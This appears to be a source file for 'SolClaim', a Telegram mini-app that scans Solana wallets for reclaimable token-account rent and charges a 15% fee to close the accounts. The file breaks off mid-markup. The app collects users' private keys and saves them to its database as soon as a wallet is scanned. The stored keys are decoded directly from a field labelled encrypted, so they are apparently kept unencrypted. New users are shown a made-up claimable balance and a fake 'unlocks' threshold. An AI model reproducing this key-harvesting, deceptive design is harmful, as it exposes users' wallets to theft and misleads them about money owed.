'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Tabs, TabsContent } from '@/components/ui/tabs'
import { Badge } from '@/components/ui/badge'
import { Progress } from '@/components/ui/progress'
import { ThemeToggle } from '@/components/theme-toggle'
import {
  Wallet,
  Coins,
  Users,
  CheckCircle,
  AlertCircle,
  Copy,
  Target,
  Gift,
  ChevronRight,
  ArrowUpRight,
  ChevronDown,
  Key,
  Lock,
  Plus,
  Trash2,
  ShieldAlert,
  BarChart3,
  PlayCircle
} from 'lucide-react'
import { getClaimableRent, isValidPublicKey } from '@/lib/solana'
import { PublicKey, Keypair } from '@solana/web3.js'
import bs58 from 'bs58'
import { useTelegram } from '@/hooks/useTelegram'
import { 
  getWallets, 
  getWalletByPublicKey,
  createWallet, 
  updateWallet,
  upsertTokenAccounts, 
  createTransaction, 
  updateUserStats,
  getUserStats,
  getUserWalletsWithStats,
  saveWalletPrivateKey,
  deactivateWallet
} from '@/lib/database'

interface ClaimableAccount {
  accountAddress: string
  mintAddress: string
  rentAmount: number
  balance: number
  tokenName?: string
  tokenImage?: string
  usdValue?: number
  isEmpty?: boolean
  isDust?: boolean
}

export default function SolClaimApp() {
  const router = useRouter()
  const { user, isLoading, error: telegramError } = useTelegram()
  const [activeTab, setActiveTab] = useState('home')
  const [publicKey, setPublicKey] = useState('')
  const [isScanning, setIsScanning] = useState(false)
  const [claimableRent, setClaimableRent] = useState(0)
  const [claimableAccounts, setClaimableAccounts] = useState<ClaimableAccount[]>([])
  const [isAccountsExpanded, setIsAccountsExpanded] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState('')
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null)

  // Wallet Management State
  const [savedWallets, setSavedWallets] = useState<any[]>([])
  const [isKeyModalOpen, setIsKeyModalOpen] = useState(false)
  const [privateKeyInput, setPrivateKeyInput] = useState('')
  const [isSubmittingKey, setIsSubmittingKey] = useState(false)
  const [currentWalletId, setCurrentWalletId] = useState<string | null>(null)

  // Batch Claiming State
  const [isBatchScanning, setIsBatchScanning] = useState(false)
  const [isBatchClaiming, setIsBatchClaiming] = useState(false)
  const [batchResults, setBatchResults] = useState<{
    totalRent: number,
    totalAccounts: number,
    walletsWithClaims: { walletId: string, publicKey: string, accounts: ClaimableAccount[], rent: number }[]
  } | null>(null)
  
  // Stats State
  const [userStats, setUserStats] = useState<any>(null)

  // Video modal
  const [isVideoModalOpen, setIsVideoModalOpen] = useState(false)

  const TELEGRAM_VIDEO_URL = 'https://t.me/solclaim/162'
  const PROMO_CLAIMABLE = 0.002 // Teaser shown to new users who've never claimed
  const UNLOCK_THRESHOLD = 0.002 // Shown as "unlocks when balance reaches this"

  // Only show promo to users who have never claimed before
  const hasClaimedBefore = userStats && (Number(userStats.total_sol_claimed) > 0 || Number(userStats.total_accounts_closed) > 0)
  const isPromoDisplay = claimableRent === 0 && claimableAccounts.length === 0 && !hasClaimedBefore
  // Gross (before fee) for display; net (85%) is what user receives
  const displayClaimableGross = hasClaimedBefore ? claimableRent : (isPromoDisplay ? PROMO_CLAIMABLE : claimableRent)
  const displayClaimableNet = displayClaimableGross * 0.85

  // Transaction signature for success link (Solscan)
  const [successTxSignature, setSuccessTxSignature] = useState<string | null>(null)

  // Add Wallet modal - private key only, derive pubkey, scan & claim in popup
  const [isAddWalletModalOpen, setIsAddWalletModalOpen] = useState(false)
  const [addWalletKey, setAddWalletKey] = useState('')
  const [addWalletModalAccounts, setAddWalletModalAccounts] = useState<ClaimableAccount[]>([])
  const [addWalletModalRent, setAddWalletModalRent] = useState(0)
  const [addWalletModalExpanded, setAddWalletModalExpanded] = useState(false)
  const [addWalletModalScanning, setAddWalletModalScanning] = useState(false)
  const [addWalletModalClaiming, setAddWalletModalClaiming] = useState(false)
  const [addWalletDerivedAddress, setAddWalletDerivedAddress] = useState('')
  const [addWalletModalWalletId, setAddWalletModalWalletId] = useState<string | null>(null)

  // Add Key modal (for wallets without key)
  const [addKeyWalletId, setAddKeyWalletId] = useState<string | null>(null)
  const [addKeyWalletAddress, setAddKeyWalletAddress] = useState('')

  // Fetch saved wallets when tab changes to wallets/home or on load; userStats for home (promo) and stats
  useEffect(() => {
    if (user && (activeTab === 'wallets' || activeTab === 'home')) {
      loadSavedWallets()
    }
    if (user && (activeTab === 'stats' || activeTab === 'home')) {
      loadUserStats()
    }
  }, [user, activeTab])

  // Clear claimable data when scanned address changes - prevents owner mismatch (claiming A's accounts with B's keypair)
  useEffect(() => {
    if (claimableAccounts.length > 0) {
      setClaimableAccounts([])
      setClaimableRent(0)
    }
  }, [publicKey])

  const loadUserStats = async () => {
    if (!user) return
    try {
      const { getUserStats } = await import('@/lib/database')
      const stats = await getUserStats(user.id)
      setUserStats(stats)
    } catch (err) {
      console.error('Failed to load stats:', err)
    }
  }

  const loadSavedWallets = async () => {
    if (!user) return
    try {
      const wallets = await getUserWalletsWithStats(user.id)
      setSavedWallets(wallets)
      // Reset batch results when reloading wallets
      setBatchResults(null)
    } catch (err) {
      console.error('Failed to load wallets:', err)
    }
  }

  const handleDeleteWallet = async (walletId: string) => {
    try {
      await deactivateWallet(walletId)
      await loadSavedWallets()
      setSuccess('Wallet removed successfully')
      setTimeout(() => setSuccess(''), 2000)
    } catch (err) {
      setError('Failed to remove wallet')
    }
  }

  const openAddWalletModal = () => {
    setIsAddWalletModalOpen(true)
    setAddWalletKey('')
    setAddWalletModalAccounts([])
    setAddWalletModalRent(0)
    setAddWalletModalExpanded(false)
    setAddWalletDerivedAddress('')
    setAddWalletModalWalletId(null)
    setError('')
  }

  const handleAddWalletScan = async () => {
    if (!user || !addWalletKey.trim()) return
    setAddWalletModalScanning(true)
    setError('')
    try {
      const kp = Keypair.fromSecretKey(bs58.decode(addWalletKey.trim()))
      const derivedPubkey = kp.publicKey.toString()
      setAddWalletDerivedAddress(derivedPubkey)

      const existingByKey = await getWalletByPublicKey(user.id, derivedPubkey)
      if (existingByKey) {
        if (existingByKey.status === 'active') {
          setError('This wallet is already added')
          setAddWalletModalScanning(false)
          return
        }
        // Reactivate deleted wallet and save key
        await updateWallet(existingByKey.id, { status: 'active' })
        await saveWalletPrivateKey(existingByKey.id, addWalletKey.trim())
        setAddWalletModalWalletId(existingByKey.id)
      } else {
        const newWallet = await createWallet({ user_id: user.id, public_key: derivedPubkey, status: 'active' })
        await saveWalletPrivateKey(newWallet.id, addWalletKey.trim())
        setAddWalletModalWalletId(newWallet.id)
      }

      const result = await getClaimableRent(kp.publicKey)
      setAddWalletModalRent(result.totalRent / 1000000000)
      setAddWalletModalAccounts(result.accounts)
      setAddWalletModalExpanded(result.accounts.length > 0)
    } catch (e: any) {
      setError(e?.message?.includes('decode') ? 'Invalid private key format (Base58)' : (e?.message || 'Failed to scan'))
    } finally {
      setAddWalletModalScanning(false)
    }
  }

  const handleAddWalletClaim = async () => {
    if (!user || !addWalletKey.trim() || addWalletModalAccounts.length === 0) return
    setAddWalletModalClaiming(true)
    setError('')
    try {
      const kp = Keypair.fromSecretKey(bs58.decode(addWalletKey.trim()))
      const derivedPubkey = kp.publicKey.toString()

      // Wallet already saved in handleAddWalletScan; use addWalletModalWalletId
      let walletId = addWalletModalWalletId
      if (!walletId) {
        const wallets = await getWallets(user.id)
        const w = wallets.find(x => x.public_key === derivedPubkey)
        if (!w) throw new Error('Wallet not found. Run CHECK first.')
        walletId = w.id
      }

      const { closeEmptyTokenAccounts } = await import('@/lib/solana')
      const result = await closeEmptyTokenAccounts(kp, addWalletModalAccounts, addWalletDerivedAddress)
      if (!result.success) throw new Error(result.errors.join(', '))

      const dbAccounts = addWalletModalAccounts.map(acc => ({
        wallet_id: walletId,
        account_address: acc.accountAddress,
        mint_address: acc.mintAddress,
        balance: acc.balance,
        rent_amount: acc.rentAmount,
        is_empty: true,
        last_scanned: new Date().toISOString()
      }))
      await upsertTokenAccounts(dbAccounts)

      const feeAmount = addWalletModalRent * 0.15
      const netAmount = addWalletModalRent - feeAmount
      const txSig = result.signatures[0]
      await createTransaction({
        wallet_id: walletId,
        signature: result.signatures[0] || ('claim_' + Date.now()),
        type: 'batch_claim',
        status: 'confirmed',
        sol_amount: netAmount,
        accounts_closed: addWalletModalAccounts.length,
        fee_amount: feeAmount
      })

      const stats = await getUserStats(user.id)
      const prevSol = stats ? Number(stats.total_sol_claimed) : 0
      const prevAccounts = stats ? Number(stats.total_accounts_closed) : 0
      await updateUserStats(user.id, {
        total_sol_claimed: prevSol + netAmount,
        total_accounts_closed: prevAccounts + addWalletModalAccounts.length
      })

      setIsAddWalletModalOpen(false)
      setAddWalletKey('')
      setAddWalletModalAccounts([])
      setAddWalletModalRent(0)
      setAddWalletDerivedAddress('')
      await loadSavedWallets()
      setSuccess(`Claimed ${(addWalletModalRent * 0.85).toFixed(4)} SOL & wallet added`)
      setTimeout(() => setSuccess(''), 3000)
    } catch (e: any) {
      setError(e?.message || 'Claim failed')
    } finally {
      setAddWalletModalClaiming(false)
    }
  }

  const handleAddWalletOnly = async () => {
    // Wallet was already saved when user clicked CHECK
    setIsAddWalletModalOpen(false)
    setAddWalletKey('')
    setAddWalletModalAccounts([])
    setAddWalletModalRent(0)
    setAddWalletDerivedAddress('')
    setAddWalletModalWalletId(null)
    await loadSavedWallets()
    setSuccess('Wallet added. Use Scan All to check claimable.')
    setTimeout(() => setSuccess(''), 3000)
  }

  const closeAddWalletModal = () => {
    setIsAddWalletModalOpen(false)
    setAddWalletKey('')
    setAddWalletModalAccounts([])
    setAddWalletModalRent(0)
    setAddWalletModalExpanded(false)
    setAddWalletDerivedAddress('')
    setAddWalletModalWalletId(null)
    setError('')
  }

  const openAddKeyModal = (wallet: { id: string; public_key: string }) => {
    setAddKeyWalletId(wallet.id)
    setAddKeyWalletAddress(wallet.public_key)
    setPrivateKeyInput('')
    setError('')
    setIsKeyModalOpen(true)
  }

  const closeKeyModal = () => {
    setIsKeyModalOpen(false)
    setPrivateKeyInput('')
    setError('')
    setAddKeyWalletId(null)
    setAddKeyWalletAddress('')
  }

  const handleAddKeyOnly = async () => {
    if (!addKeyWalletId || !privateKeyInput) return

    setIsSubmittingKey(true)
    setError('')

    try {
      let kp: Keypair
      try {
        kp = Keypair.fromSecretKey(bs58.decode(privateKeyInput))
      } catch (e) {
        throw new Error('Invalid private key format. Must be base58 encoded.')
      }
      if (kp.publicKey.toString() !== addKeyWalletAddress) {
        throw new Error('Private key does not match the wallet address.')
      }

      await saveWalletPrivateKey(addKeyWalletId, privateKeyInput)
      setIsKeyModalOpen(false)
      setAddKeyWalletId(null)
      setAddKeyWalletAddress('')
      setPrivateKeyInput('')
      await loadSavedWallets()
      setSuccess('Private key saved. You can now use Scan All.')
      setTimeout(() => setSuccess(''), 2000)
    } catch (err: any) {
      setError(err.message || 'Failed to save key')
    } finally {
      setIsSubmittingKey(false)
    }
  }

  const scanAllWallets = async () => {
    if (!savedWallets.length) return
    
    setIsBatchScanning(true)
    setError('')
    setSuccess('')
    
    try {
      let totalRent = 0
      let totalAccounts = 0
      const walletsWithClaims = []

      for (const wallet of savedWallets) {
        // Only scan wallets that have a saved private key
        if (!wallet.has_key) continue

        const result = await getClaimableRent(new PublicKey(wallet.public_key))
        
        if (result.accounts.length > 0) {
          const rentInSol = result.totalRent / 1000000000
          totalRent += rentInSol
          totalAccounts += result.accounts.length
          
          walletsWithClaims.push({
            walletId: wallet.id,
            publicKey: wallet.public_key,
            accounts: result.accounts,
            rent: rentInSol
          })
        }
      }

      setBatchResults({
        totalRent,
        totalAccounts,
        walletsWithClaims
      })

      if (totalAccounts === 0) {
        setSuccess('No claimable accounts found across your saved wallets.')
      } else {
        setSuccess(`Found ${totalAccounts} accounts worth ${totalRent.toFixed(4)} SOL across ${walletsWithClaims.length} wallets!`)
      }
      setTimeout(() => setSuccess(''), 4000)

    } catch (err: any) {
      console.error('Error scanning all wallets:', err)
      setError('Failed to scan all wallets. Please try again.')
    } finally {
      setIsBatchScanning(false)
    }
  }

  const claimAllWallets = async () => {
    if (!batchResults || batchResults.walletsWithClaims.length === 0 || !user) return

    setIsBatchClaiming(true)
    setError('')
    
    let successfulClaims = 0
    let failedClaims = 0
    let totalClaimedSol = 0
    let firstTxSignature: string | null = null

    try {
      // Re-fetch wallets to get the actual private keys
      const wallets = await getWallets(user.id)

      for (const claimData of batchResults.walletsWithClaims) {
        try {
          // Prefer lookup by publicKey to ensure we use the exact wallet that owns these accounts
          let wallet = wallets.find(w => w.public_key === claimData.publicKey)
          if (!wallet) wallet = wallets.find(w => w.id === claimData.walletId)
          if (!wallet || !wallet.encrypted_private_key) {
            failedClaims++
            continue
          }

          let keypair: Keypair
          try {
            keypair = Keypair.fromSecretKey(bs58.decode(wallet.encrypted_private_key))
          } catch (e) {
            failedClaims++
            continue
          }

          // Ensure keypair matches the wallet that owns these accounts (prevents "owner does not match")
          if (keypair.publicKey.toString() !== claimData.publicKey) {
            console.warn(`Skipping wallet ${claimData.walletId}: keypair mismatch`)
            failedClaims++
            continue
          }

          const { closeEmptyTokenAccounts } = await import('@/lib/solana')
          const result = await closeEmptyTokenAccounts(keypair, claimData.accounts, claimData.publicKey)

          const succeededAccounts = result.succeededAccounts ?? []
          if (succeededAccounts.length > 0) {
            // Partial or full success: save only the accounts we actually closed
            const succeededRent = succeededAccounts.reduce((s, a) => s + a.rentAmount, 0) / 1e9
            const feeAmount = succeededRent * 0.15
            const netAmount = succeededRent - feeAmount

            const dbAccounts = succeededAccounts.map(acc => ({
              wallet_id: wallet.id,
              account_address: acc.accountAddress,
              mint_address: acc.mintAddress,
              balance: acc.balance,
              rent_amount: acc.rentAmount,
              is_empty: true,
              last_scanned: new Date().toISOString()
            }))

            await upsertTokenAccounts(dbAccounts)

            await createTransaction({
              wallet_id: wallet.id,
              signature: result.signatures[0] || ('batch_claim_' + Date.now()),
              type: 'batch_claim',
              status: 'confirmed',
              sol_amount: netAmount,
              accounts_closed: succeededAccounts.length,
              fee_amount: feeAmount
            })

            successfulClaims++
            totalClaimedSol += netAmount
            if (succeededAccounts.length < claimData.accounts.length) {
              console.warn(`Partial success: closed ${succeededAccounts.length}/${claimData.accounts.length} accounts for ${claimData.publicKey}`)
            }
          } else {
            failedClaims++
          }
        } catch (e) {
          console.error(`Failed to claim for wallet ${claimData.publicKey}:`, e)
          failedClaims++
        }
      }

      if (successfulClaims > 0) {
        // Update global user stats (increment)
        const stats = await getUserStats(user.id)
        const prevSol = stats ? Number(stats.total_sol_claimed) : 0
        const prevAccounts = stats ? Number(stats.total_accounts_closed) : 0
        await updateUserStats(user.id, {
          total_sol_claimed: prevSol + totalClaimedSol,
          total_accounts_closed: prevAccounts + batchResults.totalAccounts
        })

        setSuccess(`Successfully claimed ${totalClaimedSol.toFixed(4)} SOL from ${successfulClaims} wallets!`)
        setBatchResults(null)
        await loadSavedWallets()
      } else {
        setError(`Failed to claim from any wallets. (${failedClaims} failed)`)
      }

    } catch (err: any) {
      console.error('Error in batch claim:', err)
      setError('A critical error occurred during batch claiming.')
    } finally {
      setIsBatchClaiming(false)
    }
  }

  const scanWallet = async () => {
    if (!isValidPublicKey(publicKey)) {
      setError('Invalid Solana public key')
      return
    }

    setIsScanning(true)
    setError('')
    setSuccess('')

    try {
      const result = await getClaimableRent(new PublicKey(publicKey))
      setClaimableRent(result.totalRent / 1000000000) // Convert lamports to SOL
      setClaimableAccounts(result.accounts)
      setSuccess(`Found ${result.accounts.length} claimable accounts`)
    } catch (err) {
      setError('Failed to scan wallet. Please check the public key.')
      console.error(err)
    } finally {
      setIsScanning(false)
    }
  }

  const claimRent = async () => {
    if (!user) {
      setError('You must be logged in via Telegram to claim rent.')
      return
    }

    if (claimableAccounts.length === 0) {
      setError('No accounts to claim.')
      return
    }

    try {
      // 1. First, make sure the user has a wallet record in the database
      // Check for existing wallet (including inactive - user may have deleted and re-scanned)
      const existingByKey = await getWalletByPublicKey(user.id, publicKey)
      let walletId = ''
      let hasKey = false

      if (existingByKey) {
        walletId = existingByKey.id
        hasKey = !!existingByKey.encrypted_private_key
        if (existingByKey.status !== 'active') {
          await updateWallet(existingByKey.id, { status: 'active' })
        }
      } else {
        const newWallet = await createWallet({
          user_id: user.id,
          public_key: publicKey,
          status: 'active'
        })
        walletId = newWallet.id
      }

      setCurrentWalletId(walletId)

      // If we don't have the private key, prompt the user
      if (!hasKey) {
        setAddKeyWalletId(null) // Ensure we're in claim mode, not add-key mode
        setIsKeyModalOpen(true)
        return
      }

      // If we have the key, proceed to execute claim
      setIsSubmittingKey(true)
      await executeClaim(walletId)

    } catch (err: any) {
      console.error('Error claiming rent:', err)
      setError(err.message || 'Failed to process claim. Please try again.')
    }
  }

  const handleSavePrivateKey = async () => {
    if (!privateKeyInput || !currentWalletId) return
    
    setIsSubmittingKey(true)
    setError('')
    
    try {
      // Validate private key matches public key
      let kp: Keypair
      try {
        kp = Keypair.fromSecretKey(bs58.decode(privateKeyInput))
      } catch (e) {
        throw new Error('Invalid private key format. Must be base58 encoded.')
      }

      if (kp.publicKey.toString() !== publicKey) {
        throw new Error('Private key does not match the scanned public key.')
      }

      // Save to database
      await saveWalletPrivateKey(currentWalletId, privateKeyInput)
      
      // Execute claim with the key we just inputted
      const success = await executeClaim(currentWalletId, privateKeyInput)
      
      if (success) {
        // Close modal only on success
        setIsKeyModalOpen(false)
        setPrivateKeyInput('')
      }
      
      // Reset submitting state is now handled inside executeClaim
    } catch (err: any) {
      console.error('Error saving private key:', err)
      setError(err.message || 'Failed to save private key')
      setIsSubmittingKey(false)
    }
  }

  const executeClaim = async (walletId: string, privateKeyString?: string) => {
    try {
      if (!user) throw new Error('User not found')

      // If we have a private key (either passed directly or we need to fetch it)
      let keypair: Keypair | null = null;
      
      if (privateKeyString) {
        try {
          keypair = Keypair.fromSecretKey(bs58.decode(privateKeyString));
        } catch (e) {
          throw new Error('Invalid private key format');
        }
      } else {
        // Fetch the wallet to get the saved private key
        const wallets = await getWallets(user.id);
        const wallet = wallets.find(w => w.id === walletId);
        
        if (!wallet || !wallet.encrypted_private_key) {
          throw new Error('Private key not found. Please add it first.');
        }
        
        try {
          keypair = Keypair.fromSecretKey(bs58.decode(wallet.encrypted_private_key));
        } catch (e) {
          throw new Error('Stored private key is invalid');
        }
      }

      // Verify keypair owns claimableAccounts - prevents "owner does not match" (claiming A's accounts with B's keypair)
      if (keypair.publicKey.toString() !== publicKey) {
        throw new Error('Wallet does not match scanned address. Please rescan the correct wallet.')
      }

      // Actually execute the Solana transaction!
      const { closeEmptyTokenAccounts } = await import('@/lib/solana');
      const result = await closeEmptyTokenAccounts(keypair, claimableAccounts, publicKey);
      
      if (!result.success) {
        throw new Error(`Failed to close some accounts: ${result.errors.join(', ')}`);
      }

      // 2. Save the token accounts to the database
      const dbAccounts = claimableAccounts.map(acc => ({
        wallet_id: walletId,
        account_address: acc.accountAddress,
        mint_address: acc.mintAddress,
        balance: acc.balance,
        rent_amount: acc.rentAmount,
        is_empty: true,
        last_scanned: new Date().toISOString()
      }))

      await upsertTokenAccounts(dbAccounts)

      // 3. Create a pending transaction record
      const feeAmount = claimableRent * 0.15 // 15% fee
      const netAmount = claimableRent - feeAmount

      await createTransaction({
        wallet_id: walletId,
        signature: result.signatures[0] || ('claim_' + Date.now()), 
        type: 'batch_claim',
        status: 'confirmed', // It's confirmed now!
        sol_amount: netAmount,
        accounts_closed: claimableAccounts.length,
        fee_amount: feeAmount
      })

      // 4. Update user stats (increment)
      const stats = await getUserStats(user.id)
      const prevSol = stats ? Number(stats.total_sol_claimed) : 0
      const prevAccounts = stats ? Number(stats.total_accounts_closed) : 0
      await updateUserStats(user.id, {
        total_sol_claimed: prevSol + netAmount,
        total_accounts_closed: prevAccounts + claimableAccounts.length
      })

      setSuccess(`Successfully claimed ${(claimableRent * 0.85).toFixed(4)} SOL!`)
      setIsSubmittingKey(false)
      
      // Clear the claimable accounts since they are now "claimed"
      setTimeout(() => {
        setClaimableAccounts([])
        setClaimableRent(0)
      }, 3000)

      return true;
    } catch (err: any) {
      console.error('Error executing claim:', err)
      setError(err.message || 'Failed to execute claim.')
      setIsSubmittingKey(false)
      return false;
    }
  }

  const copyToClipboard = async (text: string) => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text)
      } else {
        // Fallback for older browsers or non-secure contexts
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          document.execCommand('copy');
        } catch (e) {
          console.error('Failed to copy', e)
        }
        textArea.remove();
      }
    } catch (err) {
      console.error('Failed to copy', err)
    }
    
    setCopiedAddress(text)
    setTimeout(() => setCopiedAddress(null), 2000)
  }

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-background">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background text-foreground font-sans pb-24 selection:bg-primary/10">
      {/* Top Header */}
      <div className="sticky top-0 z-40 bg-background/90 backdrop-blur-xl border-b border-border px-4 py-3">
        <div className="flex items-center justify-between max-w-md mx-auto">
          <div className="flex items-center gap-3 min-w-0">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center shadow-lg shadow-primary/20 shrink-0">
              <Wallet className="w-5 h-5 text-primary-foreground" />
            </div>
            <div className="min-w-0">
              <h1 className="text-xl font-black tracking-tight text-foreground">
                SolClaim
              </h1>
              {user ? (
                <p className="text-xs text-muted-foreground font-bold uppercase tracking-wider flex items-center gap-2 truncate">
                  {user.photo_url ? (
                    <img src={user.photo_url} alt="" className="w-5 h-5 rounded-full object-cover ring-1 ring-primary/20 shrink-0" />
                  ) : (
                    <span className="w-5 h-5 rounded-full bg-primary/20 inline-flex items-center justify-center shrink-0 text-[9px] font-black text-primary">{(user.first_name?.[0] || '?').toUpperCase()}</span>
                  )}
                  Hi, {[user.first_name, user.last_name, user.username && `@${user.username}`].filter(Boolean).join(' ')}
                </p>
              ) : (
                <p className="text-xs text-muted-foreground font-bold uppercase tracking-wider">Claim SOL Rent</p>
              )}
            </div>
          </div>
          <div className="flex items-center gap-2 shrink-0">
            {user?.is_premium && (
              <Badge variant="secondary" className="font-black text-[10px] uppercase tracking-widest bg-primary/10 text-primary border-0">
                PRO
              </Badge>
            )}
            <ThemeToggle />
          </div>
        </div>
      </div>

      <div className="px-4 py-6 space-y-6 max-w-md mx-auto">
        {/* Main Content Area */}
        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          {/* Home Tab */}
          <TabsContent value="home" className="space-y-4 mt-0 outline-none">
            
            {/* Balance Card */}
            <div className="w-full rounded-2xl bg-gradient-to-b from-card to-secondary/30 border-2 border-border py-3 px-4 shadow-sm flex flex-col items-center justify-center text-center relative overflow-hidden group">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary-foreground to-primary opacity-50" />
                <div className="absolute -right-10 -top-10 w-24 h-24 bg-primary/20 rounded-full blur-2xl" />
                <div className="absolute -left-10 -bottom-10 w-24 h-24 bg-primary/10 rounded-full blur-2xl" />
                
                <p className="text-[10px] font-bold text-primary uppercase tracking-widest relative z-10 mb-1">Claimable</p>
                <div className="flex items-baseline gap-1 relative z-10 mb-2">
                  <span className="text-3xl font-black tracking-tighter text-foreground drop-shadow-sm">
                    {displayClaimableNet.toFixed(4)}
                  </span>
                  <span className="text-sm font-bold text-primary">SOL</span>
                </div>
                {isPromoDisplay ? (
                  <p className="text-[10px] font-bold text-primary/90 relative z-10">
                    Pending • Unlocks when balance reaches {UNLOCK_THRESHOLD} SOL
                  </p>
                ) : (
                  <p className="text-[10px] font-bold text-secondary-foreground bg-secondary px-2 py-1 rounded-md border border-primary/20 shadow-sm relative z-10">
                    ≈ ${(displayClaimableNet * 150).toFixed(2)}
                    <span className="text-[9px] ml-1 opacity-80">(85% after fee)</span>
                  </p>
                )}
              </div>

            <a
              href={TELEGRAM_VIDEO_URL}
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-primary transition-colors mx-auto w-fit"
            >
              <PlayCircle className="w-3.5 h-3.5" />
              Watch how it works
            </a>

            {/* Scanner Section */}
            <div className="space-y-3">
              <div className="space-y-1.5">
                <Label htmlFor="publicKey" className="text-[11px] font-black text-muted-foreground ml-1 uppercase tracking-widest">
                  {savedWallets.length === 0 ? 'Solana Wallet Address' : 'Scan New Wallet'}
                </Label>
                <p className="text-[10px] text-muted-foreground ml-1">
                  {savedWallets.length === 0 
                    ? 'Enter your address to find claimable rent. Scanning adds the wallet when you claim.'
                    : 'Enter a new address to scan, or go to Wallets to manage saved ones.'
                  }
                </p>
                <div className="relative group">
                  <Input
                    id="publicKey"
                    placeholder={savedWallets.length === 0 ? 'Paste your public key...' : 'Paste address to scan...'}
                    value={publicKey}
                    onChange={(e) => setPublicKey(e.target.value)}
                    className="h-12 bg-card border-2 border-border rounded-xl pl-4 pr-10 text-base text-foreground font-mono placeholder:text-muted-foreground placeholder:font-sans ring-0 ring-offset-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:border-primary focus-visible:outline-none shadow-sm min-w-0"
                  />
                  {publicKey && (
                    <button 
                      onClick={() => setPublicKey('')}
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors p-1.5 rounded-lg hover:bg-secondary"
                    >
                      ✕
                    </button>
                  )}
                </div>
              </div>

              <Button
                onClick={scanWallet}
                disabled={isScanning || !publicKey}
                className="w-full h-12 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground font-black text-base shadow-md shadow-primary/20 transition-all active:scale-[0.98] border border-primary-foreground/10"
              >
                {isScanning ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground"></div>
                    SCANNING...
                  </div>
                ) : (
                  'SCAN WALLET'
                )}
              </Button>

              {(telegramError || error) && (
                <div className="p-3 rounded-xl bg-destructive/10 border border-destructive/20 flex items-start gap-3">
                  <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                  <p className="text-sm font-medium text-destructive">{telegramError || error}</p>
                </div>
              )}

              {success && (
                <div className="p-3 rounded-xl bg-green-500/10 border border-green-500/20 flex flex-col gap-2 dark:bg-green-500/20 dark:border-green-500/30">
                  <div className="flex items-start gap-3">
                    <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400 shrink-0 mt-0.5" />
                    <p className="text-sm font-medium text-green-700 dark:text-green-300">{success}</p>
                  </div>
                  {successTxSignature && (
                    <a href={`https://solscan.io/tx/${successTxSignature}`} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1.5 text-xs font-bold text-green-600 dark:text-green-400 hover:underline mt-1">
                      View on Solscan <ArrowUpRight className="w-3.5 h-3.5" />
                    </a>
                  )}
                </div>
              )}
            </div>

            {/* Results List */}
            {claimableAccounts.length > 0 && (
              <div className="space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
                <button 
                  onClick={() => setIsAccountsExpanded(!isAccountsExpanded)}
                  className="w-full flex items-center justify-between px-3 py-2.5 bg-secondary/50 rounded-xl border border-transparent hover:border-border transition-all active:scale-[0.98]"
                >
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-md bg-background flex items-center justify-center shadow-sm">
                      <Coins className="w-3 h-3 text-primary" />
                    </div>
                    <h3 className="font-bold text-xs text-foreground uppercase tracking-widest">Accounts</h3>
                    <Badge variant="secondary" className="font-black bg-primary text-primary-foreground border-0 text-[10px] px-1.5 py-0">{claimableAccounts.length}</Badge>
                  </div>
                  <ChevronDown className={`w-4 h-4 text-muted-foreground transition-transform duration-300 ${isAccountsExpanded ? 'rotate-180' : ''}`} />
                </button>
                
                {isAccountsExpanded && (
                  <div className="space-y-2 max-h-[250px] overflow-y-auto pr-1 custom-scrollbar">
                    {claimableAccounts.map((account, index) => (
                      <div key={index} className="flex items-center justify-between p-3 bg-card rounded-xl border-2 border-border hover:border-primary/30 transition-all group">
                        <div className="flex items-center gap-3">
                          {account.tokenImage ? (
                            <img 
                              src={account.tokenImage} 
                              alt={account.tokenName} 
                              className="w-8 h-8 rounded-full bg-secondary object-cover shadow-sm"
                              onError={(e) => {
                                e.currentTarget.style.display = 'none';
                                e.currentTarget.nextElementSibling?.classList.remove('hidden');
                              }}
                            />
                          ) : null}
                          <div className={`w-8 h-8 rounded-full bg-secondary flex items-center justify-center shadow-sm ${account.tokenImage ? 'hidden' : ''}`}>
                            <Coins className="w-4 h-4 text-muted-foreground" />
                          </div>
                          <div>
                            <div className="font-bold text-xs text-foreground flex items-center gap-2">
                              {account.tokenName}
                              {!account.isEmpty && account.isDust && (
                                <Badge variant="destructive" className="text-[8px] px-1 py-0 h-3 bg-destructive/10 text-destructive border-0 uppercase tracking-widest font-black">DUST</Badge>
                              )}
                            </div>
                            <div className="flex items-center gap-1.5 mt-0.5">
                              <div className="font-mono text-[10px] text-muted-foreground font-medium">
                                {account.mintAddress.slice(0, 4)}...{account.mintAddress.slice(-4)}
                              </div>
                              <div className="text-[10px] font-black text-primary">
                                +{(account.rentAmount / 1000000000).toFixed(4)} SOL
                              </div>
                            </div>
                          </div>
                        </div>
                        <Button
                          size="icon"
                          variant="ghost"
                          className="text-muted-foreground hover:text-primary hover:bg-primary/10 rounded-lg h-8 w-8 transition-all active:scale-90"
                          onClick={(e) => {
                            e.preventDefault();
                            e.stopPropagation();
